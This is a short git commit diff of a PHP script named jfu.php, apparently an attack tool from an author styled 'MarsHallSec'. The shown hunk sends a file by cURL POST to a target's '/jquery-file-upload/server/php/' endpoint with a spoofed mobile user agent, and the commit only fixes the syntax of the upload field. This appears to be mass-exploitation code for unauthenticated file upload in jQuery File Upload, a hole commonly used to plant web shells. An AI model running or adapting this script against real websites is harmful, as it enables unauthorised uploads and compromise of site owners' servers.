c6a3ce7782e8f17109538cff69bffa7376721399
MarsHallSec <47811548+MarsHallGans@users.noreply.github.com>
2020-01-26 21:48:44 +0700

    Update jfu.php

--- jfu.php
+++ jfu.php
@@ -15,7 +15,7 @@ $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "$target/jquery-file-upload/server/php/");
 curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36');
 curl_setopt($ch, CURLOPT_POST, true); 
-curl_setopt($ch, CURLOPT_POSTFIELDS, array('fileToUpload'=>"@$files []"));
+curl_setopt($ch, CURLOPT_POSTFIELDS, array('fileToUpload'=>"@$files[]"));
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $postResult = curl_exec($ch);
 $gagal = curl_error($ch);
